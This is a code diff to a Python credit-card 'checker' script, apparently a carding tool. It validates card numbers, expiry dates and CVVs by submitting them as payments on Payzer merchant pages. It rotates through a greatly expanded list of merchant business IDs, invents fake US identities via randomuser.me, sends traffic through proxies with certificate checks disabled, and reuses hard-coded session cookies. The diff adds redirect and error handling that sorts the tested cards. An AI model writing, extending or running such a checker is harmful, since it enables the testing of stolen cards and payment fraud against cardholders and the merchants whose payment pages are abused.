@@ -97,37 +97,21 @@ def api_bin(bin):
 class RequisicaoException(Exception):
     def __init__(self):
         super().__init__()
+        
+class RequisicaoException2(Exception):
+    def __init__(self):
+        super().__init__()
 
 
 def reteste(card, month, year, cvv):
         checker(card, month, year, cvv)
-    
-keys = ["7492", "15273", "4908", "5255", "402", "11720", "7775", "2062", "551", "10108", "7653", "14781", "4285", "8828"]
+
+keys = ["7492", "15273", "4908", "5255", "402", "11720", "7775", "2062", "551", "10108", "7653", "14781", "4285", "8828", "2252", "7895", "3709", "101" ,"115" ,"106" ,"108" ,"113" ,"118" ,"114" ,"112" ,"111" ,"124" ,"131" ,"128" ,"126" ,"133" ,"143" ,"144" ,"141" ,"150" ,"153" ,"155" ,"157" ,"162" ,"159" ,"169" ,"173" ,"171" ,"174" ,"165" ,"170" ,"178" ,"182" ,"184" ,"188" ,"191" ,"190" ,"186" ,"185" ,"183" ,"199" ,"197" ,"203" ,"206" ,"208" ,"209" ,"204" ,"207" ,"217" ,"210" ,"225" ,"221" ,"226" ,"241" ,"236" ,"249" ,"243" ,"245" ,"247" ,"255" ,"261" ,"264" ,"259" ,"269" ,"272" ,"273" ,"279" ,"283" ,"289" ,"281" ,"293" ,"296" ,"297" ,"301" ,"302" ,"304" ,"299" ,"295" ,"309" ,"316" ,"317" ,"318" ,"320" ,"313" ,"315" ,"322" ,"323" ,"319" ,"326" ,"325" ,"330" ,"329" ,"333" ,"335" ,"339" ,"331" ,"347" ,"350" ,"343" ,"344" ,"354" ,"355" ,"346" ,"353" ,"364" ,"356" ,"372" ,"368" ,"376" ,"382" ,"386" ,"379" ,"389" ,"390" ,"396" ,"394" ,"398" ,"402" ,"400" ,"405" ,"407" ,"410" ,"415" ,"418" ,"416" ,"423" ,"424" ,"430" ,"434" ,"425" ,"441" ,"435" ,"452" ,"455" ,"449" ,"465" ,"470" ,"471" ,"461" ,"478" ,"475" ,"480" ,"484" ,"483" ,"489" ,"488" ,"485" ,"495" ,"494" ,"487" ,"501" ,"504" ,"498" ,"508" ,"511" ,"500" ,"513" ,"505" ,"509" ,"528" ,"522" ,"523" ,"534" ,"537" ,"535" ,"541" ,"543" ,"538" ,"544" ,"545" ,"549" ,"550" ,"552" ,"554" ,"551" ,"557" ,"565" ,"566" ,"570" ,"571" ,"560" ,"564" ,"573" ,"580" ,"572" ,"582" ,"583" ,"593" ,"586" ,"584" ,"592" ,"588" ,"590" ,"597" ,"604" ,"596" ,"599" ,"595" ,"609" ,"611" ,"605" ,"607" ,"619" ,"618" ,"622" ,"620" ,"631" ,"629" ,"634" ,"630" ,"633" ,"640" ,"637" ,"645" ,"644" ,"642" ,"646" ,"639" ,"660" ,"661" ,"670" ,"657" ,"665" ,"673" ,"674" ,"675" ,"672" ,"684" ,"677" ,"682" ,"680" ,"683" ,"692" ,"694" ,"690" ,"696" ,"697" ,"705" ,"704" ,"710" ,"703" ,"713" ,"716" ,"722" ,"714" ,"723" ,"719" ,"726" ,"725" ,"732" ,"734" ,"733" ,"735" ,"739" ,"741" ,"744" ,"751" ,"752" ,"754" ,"760" ,"753" ,"762" ,"765" ,"764" ,"770" ,"773" ,"777" ,"768" ,"775" ,"783" ,"785" ,"786" ,"790" ,"791" ,"795" ,"797" ,"799" ,"793" ,"805" ,"801" ,"800" ,"808" ,"810" ,"812" ,"815" ,"814" ,"807" ,"806" ,"819" ,"822" ,"825" ,"821" ,"816" ,"826" ,"830" ,"828" ,"844" ,"851" ,"850" ,"857" ,"854" ,"864" ,"865" ,"867" ,"869" ,"861" ,"862" ,"870" ,"877" ,"872" ,"876" ,"873" ,"881" ,"880" ,"884" ,"887" ,"882" ,"883" ,"891" ,"894" ,"896" ,"895" ,"902" ,"903" ,"905" ,"901" ,"908" ,"909" ,"913" ,"917" ,"915" ,"922" ,"923" ,"924" ,"934" ,"928" ,"931" ,"939" ,"933" ,"935" ,"942" ,"943" ,"952" ,"951" ,"954" ,"953" ,"956" ,"958" ,"955" ,"962" ,"965" ,"969","973" ,"975" ,"984" ,"990" ,"993" ,"978" ,"992" ,"995" ,"1000" ,"1010" ,"1012" ,"1013" ,"1009" ,"1019" ,"1023" ,"1022" ,"1026" ,"1028"]
 
 def rkey():
     return random.choice(keys)
-            # https://payzer.com/Payment/ExternalMake/businessId/7492     
-            # https://payzer.com/Payment/ExternalMake/businessId/15273
-            # https://payzer.com/Payment/ExternalMake/businessId/4908     
-            # https://payzer.com/Payment/ExternalMake/businessId/5255       
-            # https://payzer.com/Payment/ExternalMake/businessId/2118/embedded/y
-            # https://payzer.com/index.php/Payment/ExternalMake/b/5693
-            # https://payzer.com/index.php/Payment/ExternalMake/b/155
-            # https://payzer.com/Payment/ExternalMake/businessId/402
-            # https://payzer.com/Payment/ExternalMake/businessId/11720
-            # https://payzer.com/index.php/Payment/ExternalMake/b/7368
-            # https://payzer.com/index.php/Payment/ExternalMake/nt/PM-8ae08ce357d0a0f937c905942dd7a52a
-            # https://payzer.com/Payment/ExternalMake/businessId/7775
-            # https://payzer.com/Payment/ExternalMake/businessId/2062
-            # https://payzer.com/Payment/ExternalMake/businessId/551
-            # https://payzer.com/index.php/Payment/ExternalMake/b/2712
-            # https://payzer.com/Payment/ExternalMake/businessId/10108
-            # https://payzer.com/Payment/ExternalMake/businessId/7653
-            # https://payzer.com/Payment/ExternalMake/businessId/2118/embedded/y
-            #
-            #
-            #
-            #
+
+
 def definir_tipo_cartao(card):
     if card.startswith("4"):
         return "VISA"
@@ -209,8 +193,6 @@ def definir_tipo_cartao(card):
     
 def checker(card, month, year, cvv):
     try:
-        #time.sleep(3)
-
         url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
         headers = {
                 'Host': 'randomuser.me',
@@ -298,7 +280,11 @@ def checker(card, month, year, cvv):
                 'priority': 'u=0, i'
                 }
 
-            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
+            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, allow_redirects=False)
+            if  response.status_code == 302:
+                print(response.text)
+                raise RequisicaoException()
+                
             pm = pegarItem(response.text, 'name="nt" value="','"')
             
             
@@ -334,32 +320,31 @@ def checker(card, month, year, cvv):
                 'next':	'next'
             }
             headers = {
-            'Host': 'www.payzer.com',
-            'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.0.1714002983.60.0.0; _ga=GA1.2.1393613120.1713968828; _gat_gtag_UA_111485301_1=1',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'upgrade-insecure-requests': '1',
-            'origin': 'https://www.payzer.com',
-            'content-type': 'application/x-www-form-urlencoded',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'referer': f'https://www.payzer.com/Payment/ExternalMake/nt/{pm}',
-            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-            'priority': 'u=0, i'
-            }
-
+                'Host': 'www.payzer.com',
+                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.0.1714002983.60.0.0; _ga=GA1.2.1393613120.1713968828; _gat_gtag_UA_111485301_1=1',
+                'cache-control': 'max-age=0',
+                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'upgrade-insecure-requests': '1',
+                'origin': 'https://www.payzer.com',
+                'content-type': 'application/x-www-form-urlencoded',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-user': '?1',
+                'sec-fetch-dest': 'document',
+                'referer': f'https://www.payzer.com/Payment/ExternalMake/nt/{pm}',
+                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                'priority': 'u=0, i'
+                }
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
             if 'location' in response.headers:
                 loocation = response.headers.get('location')          
+                     
                              
                 url = f"https://www.payzer.com{loocation}"
-
                 payload = {}
                 headers = {
                 'Host': 'www.payzer.com',
@@ -379,38 +364,40 @@ def checker(card, month, year, cvv):
                 'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                 'priority': 'u=0, i'
                 }
-
                 response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
-            
-                url = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"
+                
 
+                
+                
+                url = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"
                 payload = f"https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}"
                 headers = {
-                'Host': 'www.payzer.com',
-                'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _gat_gtag_UA_111485301_1=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.1.1714002999.44.0.0; _ga=GA1.1.1393613120.1713968828',
-                'cache-control': 'max-age=0',
-                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'upgrade-insecure-requests': '1',
-                'origin': 'https://www.payzer.com',
-                'content-type': 'application/x-www-form-urlencoded',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-mode': 'navigate',
-                'sec-fetch-user': '?1',
-                'sec-fetch-dest': 'document',
-                'referer': f'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}',
-                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-                'priority': 'u=0, i'
-                }
-
+                    'Host': 'www.payzer.com',
+                    'Cookie': 'PHPSESSID=jb64fndpm5n22f9je0kqleo5tsoa0nft; _gid=GA1.2.778086094.1713968828; viewStyle=zend; outageMessageSeen=1; _gat_gtag_UA_111485301_1=1; _ga_4XLYQDPHZ2=GS1.1.1714002983.2.1.1714002999.44.0.0; _ga=GA1.1.1393613120.1713968828',
+                    'cache-control': 'max-age=0',
+                    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'upgrade-insecure-requests': '1',
+                    'origin': 'https://www.payzer.com',
+                    'content-type': 'application/x-www-form-urlencoded',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'sec-fetch-site': 'same-origin',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-user': '?1',
+                    'sec-fetch-dest': 'document',
+                    'referer': f'https://www.payzer.com/Payment/ExternalConfirmPayment/nt/{pm}',
+                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'priority': 'u=0, i'
+                    }
                 response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-                if 'getSelectedFinancingProduct' in response.text:
-                    raise RequisicaoException()
                 
-                #time.sleep(1)
+                
+                if 'getSelectedFinancingProduct' in response.text:
+                    raise RequisicaoException2()
+                
+                #time.sleep(2)
                 elapsed_time = time.time() - start_time
                 MSegundos = round(elapsed_time, 2)
                 
@@ -461,6 +448,9 @@ def checker(card, month, year, cvv):
         #reteste(card, month, year, cvv)
     except RequisicaoException:
         print(Fore.LIGHTWHITE_EX + f"Bad Request ({key}): {card}|{month}|{year}|{cvv}")
+        #reteste(card, month, year, cvv)
+    except RequisicaoException2:
+        print(Fore.LIGHTWHITE_EX + f"Final Error ({key}): {card}|{month}|{year}|{cvv}")
         #reteste(card, month, year, cvv)
             
 
